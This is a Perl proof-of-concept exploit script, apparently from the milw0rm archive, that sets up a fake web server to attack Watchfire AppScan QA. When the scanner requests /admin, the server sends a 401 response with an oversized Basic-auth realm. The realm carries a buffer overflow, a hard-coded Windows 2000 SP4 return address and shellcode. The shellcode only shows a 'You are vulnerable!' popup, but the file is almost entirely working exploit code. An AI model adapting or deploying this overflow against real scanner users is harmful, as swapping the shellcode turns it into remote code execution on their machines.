# Watchfire AppScan QA PoC - Coded by Mariano Nuñez Di Croce @ CYBSEC
# 
# How to use:
#	1. Run this script to setup the fake web server.
#	2. Scan the server with AppScan QA, either in Interactive or Manual mode.
#	3. If you get an "You are vulnerable!" popup, you should upgrade inmediatly.
#
#	PoC developed for Windows 2000 Server SP4.
#

#!/usr/bin/perl -w

use IO::Socket::INET;

# Dissable buffering
$| = 1;

# Define 200 OK Responses
my $res200 = "HTTP/1.1 200 OK\r\nHost: www.test.com\r\nDate: Thu, 01 Nov 2005 14:38:20 GMT\r\nServer: Apache\r\nContent-Length: 26\r\nKeep-Alive: timeout=15, max=100\r\nConnection: Close\r\nContent-Type: text/html; charset=ISO-8859-1\r\n\r\n<a href='/admin'>admin</a>";

# Define the 401 Auth Required Header and Tail
my $res401Head = "HTTP/1.1 401 Authorization Required\r\nHost: www.test.com\r\nDate: Thu, 01 Nov 2005 14:43:53 GMT\r\nServer: Apache\r\nWWW-Authenticate: Basic realm=\"";

my $res401Tail = "Content-Length: 401\r\nKeep-Alive: timeout=15, max=100\r\nConnection: Close\r\nContent-Type: text/html; charset=iso-8859-1\r\n\r\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML2.0//EN\">\r\n<html><head>\r\n<title>401 Authorization Required</title>\r\n</head><body>\r\n<h1>Authorization Required</h1>\r\n<p>This server could not verify that you\r\nare authorized to access the document\r\nrequested.  Either you supplied the wrong\r\ncredentials (e.g., bad password), or your\r\nbrowser doesn't understand how to supply\r\nthe credentials required.</p>\r\n</body></html>";

# Ret - call ebx - in user32.dll (Windows 2000 Server SP4)
my $ret = pack("l", 0x77e11627);

my $scode = "\x31\xd2\xeb\x35\x59\x88\x51\x06\xbb\x21\x02\x59\x7c\x51\xff\xd3\xeb\x33\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb\xab\x0c\x59\x7c\xff\xd3\xeb\x33\x59\x31\xd2\x88\x51\x13\x52\x51\x51\x52\xff\xd0\x31\xd2\x52\xb8\xbe\x69\x59\x7c\xff\xd0\xe8\xc6\xff\xff\xff\x75\x73\x65\x72\x33\x32\x4e\xe8\xc8\xff\xff\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc8\xff\xff\xff\x59\x6f\x75\x20\x61\x72\x65\x20\x76\x75\x6c\x6e\x65\x72\x61\x62\x6c\x65\x21\x4e";

my $resExploit = $res401Head . "\x41"x347 . "\xeb\x06AA". $ret . $scode . "\"\r\n" . $res401Tail;

# Initialization of Fake WebServer
my $srv = IO::Socket::INET->new(LocalPort => 80,
			      	Reuse => 1, 
				Listen => 1 ) || die "Could not create socket: $!\n";

print "Waiting for connections...\n";
							
while ($cli = $srv->accept()) {
	printf "Request from %s\n", $cli->peerhost;	
	while (<$cli>) {
		if (s/(admin)/$1/) {
			# If Request is for "admin", launch the exploit 
			printf "Request for protected resource detected...launching exploit\n";		
			print $cli $resExploit;
		}
		else {
			# Else send a normal response 
			print $cli $res200;	
		}
	}
	close($cli);
}
close($srv);


# milw0rm.com [2005-12-15]